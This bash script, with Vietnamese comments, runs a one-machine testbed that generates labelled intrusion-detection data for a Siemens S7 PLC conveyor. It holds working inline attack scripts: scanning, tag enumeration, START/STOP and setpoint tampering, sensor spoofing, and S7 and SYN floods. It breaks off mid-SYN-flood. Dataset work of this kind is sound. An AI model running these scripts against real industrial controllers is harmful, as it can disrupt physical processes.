#!/usr/bin/env bash
# =============================================================================
# run_combined_day.sh — Chạy CONTROLLER + ATTACKER trên CÙNG MỘT MÁY
# =============================================================================
# Khắc phục các vấn đề của hệ thống cũ (2 máy riêng):
#   1. Tag logger khởi động TRƯỚC tất cả (5s warm-up) và chạy LIÊN TỤC
#      trong suốt ngày — đảm bảo process data trong MỌI attack window.
#   2. Benign HMI 5 profile tự động xoay vòng (normal/sparse/burst/maintenance/idle).
#   3. S7_FLOOD dùng tối đa 3 threads → PLC còn đủ slot cho tag logger + HMI,
#      HMI vẫn poll xuyên suốt kể cả khi flood đang chạy (giống PLC/2-máy thật).
#   4. Nhãn ghi thời gian thực, không post-hoc.
#   5. Restore PLC sau mỗi episode integrity attack.
#
# Usage:
#   bash run_combined_day.sh --day 1 --iface 3
#   bash run_combined_day.sh --day 2 --iface 3 --target 192.168.1.10
#   bash run_combined_day.sh --day 6 --iface 3 --profile extended_300k
#
# Xem run_all_6_days.sh để chạy tự động cả 6 ngày liên tiếp.
# =============================================================================
set -uo pipefail

# ── Load testbed.conf ────────────────────────────────────────────────────────
[[ -f testbed.conf ]] && source ./testbed.conf

# ── Python command ───────────────────────────────────────────────────────────
if [[ -z "${PY_CMD:-}" ]]; then
    command -v python3 &>/dev/null && PY_CMD="python3" || PY_CMD="python"
fi
export PYTHONPATH="${PYTHONPATH:-.}"

# ── Defaults ─────────────────────────────────────────────────────────────────
DAY=""
TARGET_IP="${TARGET_IP:-192.168.1.10}"
RACK="${RACK:-0}"
SLOT="${SLOT:-1}"
CAPTURE_IFACE="${CAPTURE_IFACE:-${IFACE:-}}"
CAPTURE_ENABLED="${CAPTURE_ENABLED:-1}"
SESSION_ID="${SESSION_ID:-bt_s1}"
HOST_ID="${HOST_ID:-combined_host}"
PROFILE="${PROFILE:-standard}"   # standard | medium_100k | extended_300k

# IP nguồn riêng cho các script tấn công (tuỳ chọn). Để trống = attacker dùng
# chung IP với HMI/tag-logger (traffic PLC thấy 1 nguồn duy nhất).
# Đặt giá trị (vd 192.168.210.32) sau khi đã gán IP phụ cho NIC bằng lệnh:
#   netsh interface ip add address "<Tên NIC>" 192.168.210.32 255.255.255.0
# thì mọi kết nối tấn công sẽ bind IP này làm nguồn -> PLC/switch thấy 2 IP
# khác nhau giống hệt kịch bản chạy 2 máy (run_day_bangtruyen.sh).
ATTACKER_SRC_IP="${ATTACKER_SRC_IP:-}"

CAPTURE_DIR="${CAPTURE_DIR:-captures}"
LOG_DIR="${LOG_DIR:-logs}"
LABEL_DIR="${LABEL_DIR:-labels}"

Q0_ALLOWED_MASK="${Q0_ALLOWED_MASK:-0x41}"
DEFAULT_CD_MS="${DEFAULT_CD_MS:-5000}"

# Durations (giây) — standard profile
D1_DUR="${D1_DUR:-10800}"   # Day 1: 3h benign
D2_DUR="${D2_DUR:-14400}"   # Day 2: 4h recon
D3_DUR="${D3_DUR:-14400}"   # Day 3: integrity part-1
D4_DUR="${D4_DUR:-14400}"   # Day 4: integrity part-2
D5_DUR="${D5_DUR:-14400}"   # Day 5: availability
D6_DUR="${D6_DUR:-14400}"   # Day 6: OOD holdout — dài hơn để đủ mẫu ood cho từng kịch bản

# Attack durations per rate (giây)
DUR_SLOW="${DUR_SLOW:-300}"     # 5 phút
DUR_NORMAL="${DUR_NORMAL:-240}" # 4 phút
DUR_FAST="${DUR_FAST:-180}"     # 3 phút
DUR_STEALTHY_NORMAL="${DUR_STEALTHY_NORMAL:-480}"  # STEALTHY cần dài hơn

# Gap giữa các episode (giây)
EPISODE_GAP="${EPISODE_GAP:-300}"       # 5 phút
WARMUP_S="${WARMUP_S:-120}"             # 2 phút warm-up đầu ngày
COOLDOWN_S="${COOLDOWN_S:-300}"         # 5 phút cooldown cuối ngày
S7_FLOOD_THREADS="${S7_FLOOD_THREADS:-3}"   # tối đa 3 để dành slot cho logger
SYN_FLOOD_THREADS="${SYN_FLOOD_THREADS:-10}"

# Số lần lặp episode mỗi ngày (standard: 3 lần slow/normal/fast xoay vòng)
REPS_DAY2="${REPS_DAY2:-3}"
REPS_DAY3="${REPS_DAY3:-3}"
REPS_DAY4="${REPS_DAY4:-3}"
REPS_DAY5="${REPS_DAY5:-3}"

# Day 6 OOD holdout — số chu kỳ lặp qua toàn bộ 9 kịch bản + range thời lượng theo nhóm
DAY6_CYCLES="${DAY6_CYCLES:-1}"
DAY6_GAP_MIN="${DAY6_GAP_MIN:-120}"
DAY6_GAP_MAX="${DAY6_GAP_MAX:-900}"
DAY6_SCANENUM_MIN="${DAY6_SCANENUM_MIN:-180}"
DAY6_SCANENUM_MAX="${DAY6_SCANENUM_MAX:-360}"
DAY6_INTEGRITY_MIN="${DAY6_INTEGRITY_MIN:-180}"
DAY6_INTEGRITY_MAX="${DAY6_INTEGRITY_MAX:-360}"
DAY6_AVAIL_MIN="${DAY6_AVAIL_MIN:-180}"
DAY6_AVAIL_MAX="${DAY6_AVAIL_MAX:-360}"

TAG_LOGGER_PID=""
HMI_PID=""
TSHARK_PID=""
declare -a ALL_PIDS=()

# ── Parse args ────────────────────────────────────────────────────────────────
usage() {
    cat <<'EOF'
Usage:
  bash run_combined_day.sh --day <1-6> --iface <NIC> [options]

Options:
  --day N           Day number 1-6 (required)
  --target IP       PLC IP (default: 192.168.1.10)
  --rack N          PLC rack (default: 0)
  --slot N          PLC slot (default: 1)
  --iface NIC       TShark interface (run tshark -D to list, e.g. 3 or eth0)
  --session ID      Session ID (default: bt_s1)
  --profile P       standard (~23h, ~41k window 2s) | medium_100k (~59h, ~100k window 2s) | extended_300k (~177h, ~300k window 2s)
  --attacker-src-ip IP  IP phụ để attacker bind làm nguồn (PLC thấy 2 IP như 2 máy)
  --no-capture      Skip TShark
  --no-preflight    Skip preflight check
EOF
}

NO_CAPTURE=0
NO_PREFLIGHT=0
while [[ $# -gt 0 ]]; do
    case "$1" in
        --day)        DAY="$2";           shift 2 ;;
        --target)     TARGET_IP="$2";     shift 2 ;;
        --rack)       RACK="$2";          shift 2 ;;
        --slot)       SLOT="$2";          shift 2 ;;
        --iface)      CAPTURE_IFACE="$2"; shift 2 ;;
        --session)    SESSION_ID="$2";    shift 2 ;;
        --profile)    PROFILE="$2";       shift 2 ;;
        --attacker-src-ip) ATTACKER_SRC_IP="$2"; shift 2 ;;
        --no-capture) NO_CAPTURE=1;       shift ;;
        --no-preflight) NO_PREFLIGHT=1;   shift ;;
        -h|--help)    usage; exit 0 ;;
        *) echo "[ERROR] Unknown option: $1" >&2; usage; exit 1 ;;
    esac
done

[[ -z "$DAY" ]]   && { echo "[ERROR] --day required" >&2; usage; exit 1; }
[[ -z "$CAPTURE_IFACE" && "$NO_CAPTURE" == "0" ]] && {
    echo "[ERROR] --iface required (run: tshark -D)" >&2; exit 1
}
[[ "$DAY" =~ ^[1-6]$ ]] || { echo "[ERROR] --day must be 1..6" >&2; exit 1; }

# Extended profile overrides
# extended_300k: tổng ~177h/6 ngày, nhắm ~300k window 2s (khớp feature_extract.py --window 2).
# medium_100k:   đúng 1/3 số của extended_300k (giữ nguyên tỉ lệ giữa các ngày/gap/rep),
#                tổng ~59h/6 ngày, nhắm ~100k window 2s — dùng khi không đủ thời gian
#                chạy hết ~177h nhưng vẫn cần khối lượng đáng kể hơn standard (~23h/~41k window 2s).
if [[ "$PROFILE" == "medium_100k" ]]; then
    D1_DUR="24000"; D2_DUR="33600"; D3_DUR="34400"
    D4_DUR="52800"; D5_DUR="38400"; D6_DUR="30000"
    DUR_SLOW="600"; DUR_NORMAL="1200"; DUR_FAST="120"
    DUR_STEALTHY_NORMAL="2200"
    EPISODE_GAP="400"; WARMUP_S="1200"; COOLDOWN_S="1200"

    REPS_DAY2="4"; REPS_DAY3="3"; REPS_DAY4="4"; REPS_DAY5="3"

    DAY6_CYCLES="1"
    DAY6_GAP_MIN="200"; DAY6_GAP_MAX="600"
    DAY6_SCANENUM_MIN="400"; DAY6_SCANENUM_MAX="800"
    DAY6_INTEGRITY_MIN="300"; DAY6_INTEGRITY_MAX="600"
    DAY6_AVAIL_MIN="200"; DAY6_AVAIL_MAX="400"
elif [[ "$PROFILE" == "extended_300k" ]]; then
    D1_DUR="72000"; D2_DUR="100800"; D3_DUR="103200"
    D4_DUR="158400"; D5_DUR="115200"; D6_DUR="90000"
    DUR_SLOW="1800"; DUR_NORMAL="3600"; DUR_FAST="360"
    DUR_STEALTHY_NORMAL="6600"
    EPISODE_GAP="1200"; WARMUP_S="3600"; COOLDOWN_S="3600"

    REPS_DAY2="12"; REPS_DAY3="10"; REPS_DAY4="12"; REPS_DAY5="10"

    DAY6_CYCLES="3"
    DAY6_GAP_MIN="600"; DAY6_GAP_MAX="1800"
    DAY6_SCANENUM_MIN="1200"; DAY6_SCANENUM_MAX="2400"
    DAY6_INTEGRITY_MIN="900"; DAY6_INTEGRITY_MAX="1800"
    DAY6_AVAIL_MIN="600"; DAY6_AVAIL_MAX="1200"
fi

mkdir -p "$CAPTURE_DIR" "$LOG_DIR" "$LABEL_DIR"

# ── Session id gắn theo ngày ─────────────────────────────────────────────────
# SESSION_ID gốc (vd "bt_s1") không đủ để phân biệt các ngày khi ghi vào cột
# session_id của CSV/tag-logger/attack-event — điều này làm hỏng GroupKFold theo
# session và làm "--validation-session-id day6" không khớp được dòng nào lúc
# train. Gắn ngày vào đây một lần, dùng thống nhất cho MỌI nơi ghi ra dữ liệu.
SESSION_BASE="$SESSION_ID"
SESSION_ID="${SESSION_BASE}_day${DAY}"

# ── Env cho label writers ─────────────────────────────────────────────────────
export LABEL_CSV_PATH="$LABEL_DIR/${SESSION_ID}_timeline.csv"
export ATTACK_EVENT_FILE="$LABEL_DIR/${SESSION_ID}_attack_events.csv"
export SESSION_ID HOST_ID
export DAY ATTACK_PROFILE="standard"

# ── Cleanup ───────────────────────────────────────────────────────────────────
cleanup() {
    echo "[cleanup] Stopping all processes..."
    for pid in "${ALL_PIDS[@]:-}"; do
        kill "$pid" 2>/dev/null || true
    done
    wait 2>/dev/null || true
    echo "[cleanup] Done."
}
trap cleanup EXIT INT TERM

# =============================================================================
#  UTILITY
# =============================================================================
now_ms() { "$PY_CMD" -c "import time; print(int(time.time()*1000))"; }

rand_range() {
    local lo="$1" hi="$2"
    "$PY_CMD" -c "import random,sys; print(random.randint(int(sys.argv[1]),int(sys.argv[2])))" "$lo" "$hi"
}

log() { echo "[$(date +%H:%M:%S)] $*"; }

label() {
    local scenario="$1" action="$2" episode_id="${3:-}" note="${4:-}"
    local ts f
    ts="$(now_ms)"
    f="$LABEL_CSV_PATH"
    [[ ! -f "$f" ]] && echo "attacker_timestamp_ms,scenario_label,action,session_id,host_id,episode_id,day,note" > "$f"
    note="${note//,/;}"
    printf '%s,%s,%s,%s,%s,%s,day%s,%s\n' \
        "$ts" "$scenario" "$action" "$SESSION_ID" "$HOST_ID" "${episode_id//,/;}" "$DAY" "$note" >> "$f"
    log "LABEL $scenario $action ep=$episode_id"
}

ep_id() { echo "${SESSION_ID}:day${DAY}:${1}:${2}:r${3}"; }

wait_s() {
    local secs="$1" msg="${2:-}"
    [[ "${secs:-0}" -le 0 ]] && return 0
    log "Wait ${secs}s ${msg}"
    sleep "$secs"
}

stop_pid() {
    local pid="$1"
    [[ -z "$pid" ]] && return
    kill "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
}

# =============================================================================
#  PREFLIGHT
# =============================================================================
preflight() {
    [[ "$NO_PREFLIGHT" == "1" ]] && return 0
    log "[preflight] Checking PLC $TARGET_IP rack=$RACK slot=$SLOT ..."
    "$PY_CMD" - <<PYEOF
import sys
import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas

c = snap7.client.Client()
try:
    c.connect("$TARGET_IP", int("$RACK"), int("$SLOT"))
    state = "UNKNOWN"
    try: state = str(c.get_cpu_state())
    except Exception: pass
    m5 = c.read_area(Areas.MK, 0, 5, 1)
    print(f"[preflight] OK — CPU={state}  M5=0x{m5[0]:02X}", flush=True)
    c.disconnect()
    sys.exit(0)
except Exception as e:
    print(f"[preflight] FAIL: {e}", flush=True)
    sys.exit(1)
PYEOF
}

# =============================================================================
#  PLC RESTORE — gọi sau mỗi integrity attack
# =============================================================================
restore_plc() {
    log "[restore] Restoring PLC to safe state..."
    "$PY_CMD" - <<PYEOF || true
import sys, time
import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import set_bool, set_dint

c = snap7.client.Client()
try:
    c.connect("$TARGET_IP", int("$RACK"), int("$SLOT"))
    # Clear M5: all bits off
    m5 = bytearray(c.read_area(Areas.MK, 0, 5, 1))
    for b in range(8): set_bool(m5, 0, b, False)
    c.write_area(Areas.MK, 0, 5, bytes(m5))
    # Clear M6 sensor bits
    m6 = bytearray(c.read_area(Areas.MK, 0, 6, 1))
    for b in [0, 1, 2]: set_bool(m6, 0, b, False)
    c.write_area(Areas.MK, 0, 6, bytes(m6))
    # Restore timers to default
    for offset in [50, 54, 58, 62]:
        buf = bytearray(4)
        set_dint(buf, 0, int("$DEFAULT_CD_MS"))
        c.write_area(Areas.MK, 0, offset, bytes(buf))
    # Send START pulse
    m5 = bytearray(c.read_area(Areas.MK, 0, 5, 1))
    set_bool(m5, 0, 0, True); set_bool(m5, 0, 1, False)
    c.write_area(Areas.MK, 0, 5, bytes(m5))
    time.sleep(0.3)
    set_bool(m5, 0, 0, False)
    c.write_area(Areas.MK, 0, 5, bytes(m5))
    print("[restore] OK", flush=True)
    c.disconnect()
except Exception as e:
    print(f"[restore] WARN: {e}", flush=True)
    try: c.disconnect()
    except Exception: pass
PYEOF
    sleep 1
}

# =============================================================================
#  TSHARK — một capture cho toàn bộ (SPAN port thấy hết)
# =============================================================================
start_capture() {
    [[ "$NO_CAPTURE" == "1" ]] && return 0
    local pcap="$CAPTURE_DIR/${SESSION_ID}.pcapng"
    log "[tshark] Capturing on $CAPTURE_IFACE → $pcap"
    tshark -n -i "$CAPTURE_IFACE" \
        -f "host $TARGET_IP or ether proto 0x8892 or arp" \
        -w "$pcap" -q \
        -o "tls.desegment_ssl_records:FALSE" &
    TSHARK_PID="$!"
    ALL_PIDS+=("$TSHARK_PID")
    sleep 2
    if ! kill -0 "$TSHARK_PID" 2>/dev/null; then
        log "[tshark] ERROR: failed to start. Check interface with: tshark -D"
        TSHARK_PID=""
    else
        log "[tshark] Started PID=$TSHARK_PID"
    fi
}

# =============================================================================
#  TAG LOGGER — chạy liên tục suốt cả ngày (KHÔNG DỪNG giữa episodes)
# =============================================================================
start_tag_logger() {
    local out="$LOG_DIR/${SESSION_ID}_tags.csv"
    log "[tag_logger] Starting → $out"
    "$PY_CMD" log_tags_bangtruyen.py \
        --target "$TARGET_IP" --rack "$RACK" --slot "$SLOT" \
        --interval 0.5 \
        --q0-allowed-mask "$Q0_ALLOWED_MASK" \
        --output "$out" \
        --session-id "$SESSION_ID" \
        --host-id "$HOST_ID" \
        --scenario-id "BENIGN_READER" \
        --episode-id "${SESSION_ID}:day${DAY}:TAG_LOGGER" \
        --day "day${DAY}" &
    TAG_LOGGER_PID="$!"
    ALL_PIDS+=("$TAG_LOGGER_PID")
    log "[tag_logger] Started PID=$TAG_LOGGER_PID (will run ALL DAY)"
    sleep 5   # warm-up: đảm bảo logger kết nối trước khi bất cứ thứ gì khác chạy
}

# =============================================================================
#  HMI BENIGN — 5 profiles tự động xoay vòng, chạy xuyên suốt kể cả khi S7_FLOOD
#  đang chạy (PLC thật không chủ động ngắt session HMI đã kết nối chỉ vì có
#  connection request mới bị từ chối — chỉ từ chối cái mới, không đá cái cũ).
#  S7_FLOOD_THREADS đã giới hạn (3) để chừa slot cho tag_logger + HMI.
# =============================================================================
start_hmi_diverse() {
    log "[hmi] Starting diverse HMI poll (5 profiles, auto-rotate)"
    "$PY_CMD" -u - <<PYEOF &
import os, random, time, sys
import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import set_bool

TARGET  = "$TARGET_IP"
RACK    = int("$RACK")
SLOT    = int("$SLOT")

# 5 profiles: (name, min_interval, max_interval, weight)
PROFILES = [
    ("normal_hmi",   1.0,  2.0,  35),   # HMI chuẩn — poll 1-2s
    ("sparse_hmi",   5.0, 20.0,  20),   # HMI thưa — kỹ sư không chú ý
    ("burst_hmi",    0.2,  0.5,  15),   # HMI nhanh — alarm monitoring
    ("maintenance",  0.8,  1.5,  20),   # Kỹ sư: đọc tuần tự toàn M area
    ("idle_quiet",  30.0, 60.0,  10),   # Không poll, chỉ keepalive
]

def pick_profile():
    names, weights = zip(*[(p[0], p[3]) for p in PROFILES])
    return random.choices(names, weights=weights, k=1)[0]

def get_interval(pname):
    for p in PROFILES:
        if p[0] == pname:
            return random.uniform(p[1], p[2])
    return random.uniform(1.0, 2.0)

c = snap7.client.Client()
profile = pick_profile()
switch_at = time.time() + random.uniform(300, 900)   # đổi profile sau 5-15 phút

print(f"[HMI] profile={profile}", flush=True)
n = 0

while True:
    # Đổi profile định kỳ
    if time.time() >= switch_at:
        profile = pick_profile()
        switch_at = time.time() + random.uniform(300, 900)
        print(f"[HMI] profile switch → {profile}", flush=True)

    # Reconnect nếu mất kết nối
    if not c.get_connected():
        try:
            c.connect(TARGET, RACK, SLOT)
        except Exception as e:
            time.sleep(2.0)
            continue

    try:
        if profile == "idle_quiet":
            pass   # chỉ giữ TCP alive, không đọc
        elif profile == "maintenance":
            # Đọc tuần tự toàn M area (như kỹ sư dùng Watch Table)
            c.read_area(Areas.MK, 0, 0, 80)
            c.read_area(Areas.PE, 0, 0, 2)
            c.read_area(Areas.PA, 0, 0, 1)
        elif profile == "burst_hmi":
            # Đọc nhanh chỉ status bits (alarm monitoring)
            c.read_area(Areas.MK, 0, 5, 2)
            c.read_area(Areas.PA, 0, 0, 1)
        else:
            # normal_hmi / sparse_hmi — HMI đọc đầy đủ
            c.read_area(Areas.MK, 0, 0, 80)
            c.read_area(Areas.PA, 0, 0, 1)
            c.read_area(Areas.PE, 0, 0, 2)

        # 2% xác suất gửi START pulse hợp lệ (như operator nhấn nút)
        if random.random() < 0.02:
            m5 = bytearray(c.read_area(Areas.MK, 0, 5, 1))
            set_bool(m5, 0, 0, True);  set_bool(m5, 0, 1, False)
            c.write_area(Areas.MK, 0, 5, bytes(m5))
            time.sleep(0.25)
            set_bool(m5, 0, 0, False)
            c.write_area(Areas.MK, 0, 5, bytes(m5))

        n += 1
        if n % 100 == 0:
            print(f"[HMI] {n} polls profile={profile}", flush=True)

    except Exception as e:
        try: c.disconnect()
        except Exception: pass
        time.sleep(1.0)

    time.sleep(get_interval(profile))
PYEOF
    HMI_PID="$!"
    ALL_PIDS+=("$HMI_PID")
    log "[hmi] Started PID=$HMI_PID"
}

# =============================================================================
#  ATTACK SCRIPTS — inline Python processes
# =============================================================================

# Chèn vào đầu mỗi script tấn công: nếu ATTACKER_SRC_IP được set, mọi socket
# (raw TCP lẫn snap7 — python-snap7 dùng socket.socket() thuần Python bên trong)
# sẽ bind IP này làm nguồn trước khi connect, để PLC/switch thấy 2 IP khác nhau
# cho benign (HMI) và attack, giống hệt khi chạy 2 máy riêng.
read -r -d '' SRC_BIND_PREAMBLE <<'PYSRC' || true
import os as _os, socket as _socket
_SRC_IP = _os.environ.get("ATTACKER_SRC_IP", "")
if _SRC_IP:
    _orig_connect = _socket.socket.connect
    def _bound_connect(self, address, _orig=_orig_connect, _src=_SRC_IP):
        try:
            self.bind((_src, 0))
        except OSError:
            pass
        return _orig(self, address)
    _socket.socket.connect = _bound_connect
PYSRC

start_attack() {
    local scenario="$1"
    local rate="$2"       # slow | normal | fast
    local episode_id="$3"

    case "$rate" in
        slow)   ATTACK_PROFILE="slow"           ;;
        normal) ATTACK_PROFILE="standard"       ;;
        fast)   ATTACK_PROFILE="extended_300k"  ;;
        ood)    ATTACK_PROFILE="day6_ood"       ;;  # chỉ Day 6 dùng — nằm ngoài khoảng train
        *)      ATTACK_PROFILE="standard"       ;;
    esac
    export ATTACK_PROFILE ATTACK_EVENT_FILE ATTACK_EPISODE_ID="$episode_id" ATTACKER_SRC_IP

    case "$scenario" in

        SCAN_PORT)
"$PY_CMD" -u - <<PYEOF &
import os, random, socket, time
$SRC_BIND_PREAMBLE
TARGET = "$TARGET_IP"
RATE = "$rate"
SLEEP = {"slow": (2.0, 6.0), "normal": (0.4, 1.5), "fast": (0.05, 0.3), "ood": (10.0, 25.0)}[RATE]
n = 0
while True:
    try:
        s = socket.create_connection((TARGET, 102), timeout=1.0); s.close()
    except Exception: pass
    n += 1
    if n % 50 == 0: print(f"[SCAN] {n} probes rate={RATE}", flush=True)
    time.sleep(random.uniform(*SLEEP))
PYEOF
            ;;

        ENUM_TAGS)
"$PY_CMD" -u - <<PYEOF &
import os, random, time
import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
$SRC_BIND_PREAMBLE
TARGET="$TARGET_IP"; RACK=int("$RACK"); SLOT=int("$SLOT"); RATE="$rate"
SLEEP = {"slow": (3.0, 8.0), "normal": (0.15, 0.5), "fast": (0.03, 0.15), "ood": (12.0, 20.0)}[RATE]
c = snap7.client.Client(); n = 0
while True:
    try:
        if not c.get_connected(): c.connect(TARGET, RACK, SLOT)
        c.read_area(Areas.MK, 0, 0, 80)
        try: c.read_area(Areas.PA, 0, 0, 1)
        except Exception: pass
        try: c.read_area(Areas.PE, 0, 0, 2)
        except Exception: pass
        n += 1
        if n % 30 == 0: print(f"[ENUM] {n} scans rate={RATE}", flush=True)
    except Exception as e:
        print(f"[ENUM] WARN {e}", flush=True)
        try: c.disconnect()
        except Exception: pass
        time.sleep(1.0)
    time.sleep(random.uniform(*SLEEP))
PYEOF
            ;;

        RWRITE_BURST)
"$PY_CMD" -u - <<PYEOF &
import os, random, time
import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool
from attack_event_logger import log_attack_event
$SRC_BIND_PREAMBLE

TARGET="$TARGET_IP"; RACK=int("$RACK"); SLOT=int("$SLOT"); RATE="$rate"
SLEEP = {"slow": (2.0, 6.0), "normal": (0.15, 0.45), "fast": (0.03, 0.12), "ood": (10.0, 20.0)}[RATE]
c = snap7.client.Client(); toggle = True; n = 0
print(f"[RWRITE] M5.0/M5.1 toggle rate={RATE}", flush=True)
while True:
    try:
        if not c.get_connected(): c.connect(TARGET, RACK, SLOT)
        m5 = bytearray(c.read_area(Areas.MK, 0, 5, 1))
        old = m5[0]
        if toggle:
            set_bool(m5, 0, 0, False); set_bool(m5, 0, 1, True)   # STOP
        else:
            set_bool(m5, 0, 1, False); set_bool(m5, 0, 0, True)   # START
        c.write_area(Areas.MK, 0, 5, bytes(m5))
        if old != m5[0]:
            log_attack_event("M5_STARTSTOP", area="MK", byte_offset=5, data_type="byte",
                             old_value=old, new_value=m5[0])
        toggle = not toggle; n += 1
        if n % 50 == 0: print(f"[RWRITE] {n} writes rate={RATE}", flush=True)
    except Exception as e:
        print(f"[RWRITE] WARN {e}", flush=True)
        try: c.disconnect()
        except Exception: pass
        time.sleep(1.0)
    time.sleep(random.uniform(*SLEEP))
PYEOF
            ;;

        SETPOINT_ATTACK)
"$PY_CMD" -u - <<PYEOF &
import os, random, time
import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_dint, set_dint
from attack_event_logger import log_attack_event
$SRC_BIND_PREAMBLE

TARGET="$TARGET_IP"; RACK=int("$RACK"); SLOT=int("$SLOT"); RATE="$rate"
SLEEP = {"slow": (15.0, 40.0), "normal": (1.5, 5.0), "fast": (0.3, 1.0), "ood": (45.0, 90.0)}[RATE]
VALS  = {"slow": [45000, 60000, 90000],
         "normal": [100, 250, 45000, 60000, 90000],
         "fast":   [50, 100, 250, 5000, 45000, 90000],
         "ood":    [30000, 45000, 60000, 90000, 120000, 150000]}[RATE]
TIMES = [0, 60000, 120000, 180000]

def rdint(c, off):
    return get_dint(c.read_area(Areas.MK, 0, off, 4), 0)
def wdint(c, off, val, sig):
    old = rdint(c, off)
    buf = bytearray(4); set_dint(buf, 0, int(val))
    c.write_area(Areas.MK, 0, off, bytes(buf))
    if old != val:
        log_attack_event(sig, area="MK", byte_offset=off, data_type="dint",
                         old_value=old, new_value=int(val))

c = snap7.client.Client(); n = 0
print(f"[SETPOINT] CD1/CD2/CD3 randomization rate={RATE}", flush=True)
while True:
    try:
        if not c.get_connected(): c.connect(TARGET, RACK, SLOT)
        wdint(c, 54, random.choice(VALS), "CD1_MS")
        wdint(c, 58, random.choice(VALS), "CD2_MS")
        wdint(c, 62, random.choice(VALS), "CD3_MS")
        wdint(c, 50, random.choice(TIMES), "Times_1_MS")
        n += 1
        if n % 20 == 0: print(f"[SETPOINT] {n} writes rate={RATE}", flush=True)
    except Exception as e:
        print(f"[SETPOINT] WARN {e}", flush=True)
        try: c.disconnect()
        except Exception: pass
        time.sleep(1.0)
    time.sleep(random.uniform(*SLEEP))
PYEOF
            ;;

        SENSOR_SPOOF)
"$PY_CMD" -u - <<PYEOF &
import os, random, time
import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool
from attack_event_logger import log_attack_event
$SRC_BIND_PREAMBLE

TARGET="$TARGET_IP"; RACK=int("$RACK"); SLOT=int("$SLOT"); RATE="$rate"
SLEEP = {"slow": (8.0, 20.0), "normal": (0.4, 1.5), "fast": (0.1, 0.4), "ood": (25.0, 45.0)}[RATE]
PATTERNS = [(1,1,1), (1,0,1), (0,1,1), (1,1,0), (0,0,1), (1,0,0)]

c = snap7.client.Client(); n = 0
print(f"[SPOOF] Vat_1/2/3 sensor spoofing rate={RATE}", flush=True)
while True:
    try:
        if not c.get_connected(): c.connect(TARGET, RACK, SLOT)
        v1, v2, v3 = random.choice(PATTERNS)
        m5 = bytearray(c.read_area(Areas.MK, 0, 5, 1))
        m6 = bytearray(c.read_area(Areas.MK, 0, 6, 1))
        old5, old6 = m5[0], m6[0]
        set_bool(m5, 0, 4, bool(v1))   # M5.4 Vat_1
        set_bool(m5, 0, 6, bool(v2))   # M5.6 Vat_2
        set_bool(m6, 0, 0, bool(v3))   # M6.0 Vat_3
        c.write_area(Areas.MK, 0, 5, bytes(m5))
        c.write_area(Areas.MK, 0, 6, bytes(m6))
        if old5 != m5[0]:
            log_attack_event("Vat1_Vat2", area="MK", byte_offset=5, data_type="byte",
                             old_value=old5, new_value=m5[0])
        if old6 != m6[0]:
            log_attack_event("Vat3", area="MK", byte_offset=6, data_type="byte",
                             old_value=old6, new_value=m6[0])
        n += 1
        if n % 30 == 0: print(f"[SPOOF] {n} writes Vat=({v1},{v2},{v3}) rate={RATE}", flush=True)
    except Exception as e:
        print(f"[SPOOF] WARN {e}", flush=True)
        try: c.disconnect()
        except Exception: pass
        time.sleep(1.0)
    time.sleep(random.uniform(*SLEEP))
PYEOF
            ;;

        STEALTHY_WRITE)
"$PY_CMD" -u - <<PYEOF &
import os, random, time
import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool
from attack_event_logger import log_attack_event
$SRC_BIND_PREAMBLE

TARGET="$TARGET_IP"; RACK=int("$RACK"); SLOT=int("$SLOT"); RATE="$rate"
SLEEP = {"slow": (60.0, 120.0), "normal": (15.0, 45.0), "fast": (3.0, 10.0), "ood": (150.0, 300.0)}[RATE]

c = snap7.client.Client(); n = 0
print(f"[STEALTHY] Low-rate STOP writes M5.1 rate={RATE} interval={SLEEP}", flush=True)
while True:
    try:
        if not c.get_connected(): c.connect(TARGET, RACK, SLOT)
        m5 = bytearray(c.read_area(Areas.MK, 0, 5, 1))
        old = m5[0]
        set_bool(m5, 0, 1, True); set_bool(m5, 0, 0, False)   # STOP
        c.write_area(Areas.MK, 0, 5, bytes(m5))
        if old != m5[0]:
            log_attack_event("M5.1_STOP", area="MK", byte_offset=5, bit_offset=1,
                             data_type="bool", old_value=0, new_value=1)
        n += 1
        print(f"[STEALTHY] #{n} STOP write, sleeping {SLEEP}s rate={RATE}", flush=True)
    except Exception as e:
        print(f"[STEALTHY] WARN {e}", flush=True)
        try: c.disconnect()
        except Exception: pass
        time.sleep(2.0)
    time.sleep(random.uniform(*SLEEP))
PYEOF
            ;;

        S7_FLOOD)
"$PY_CMD" -u - <<PYEOF &
import os, random, threading, time
import snap7
$SRC_BIND_PREAMBLE

TARGET="$TARGET_IP"; RACK=int("$RACK"); SLOT=int("$SLOT"); RATE="$rate"
# Tối đa 3 threads để dành slot cho tag_logger + HMI
N_THR = {"slow": 1, "normal": 2, "fast": 3, "ood": 1}[RATE]
HOLD  = {"slow": (0.5, 2.0), "normal": (0.05, 0.3), "fast": (0.02, 0.1), "ood": (3.0, 8.0)}[RATE]
ok = 0; fail = 0; lock = threading.Lock()

def worker():
    global ok, fail
    while True:
        c = snap7.client.Client()
        try:
            c.connect(TARGET, RACK, SLOT)
            time.sleep(random.uniform(*HOLD))
            c.disconnect()
            with lock:
                ok += 1
                if ok % 50 == 0: print(f"[S7_FLOOD] ok={ok} fail={fail} threads={N_THR}", flush=True)
        except Exception:
            with lock: fail += 1
            time.sleep(random.uniform(0.05, 0.3))

print(f"[S7_FLOOD] {N_THR} threads rate={RATE}", flush=True)
ts = [threading.Thread(target=worker, daemon=True) for _ in range(N_THR)]
for t in ts: t.start()
while True: time.sleep(1)
PYEOF
            ;;

        SYN_FLOOD)
"$PY_CMD" -u - <<PYEOF &
import os, random, socket, threading, time
$SRC_BIND_PREAMBLE

TARGET="$TARGET_IP"; RATE="$rate"
N_THR = {"slow": 2, "normal": 8, "fast": 15, "ood": 1}[RATE]

def worker():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.08)
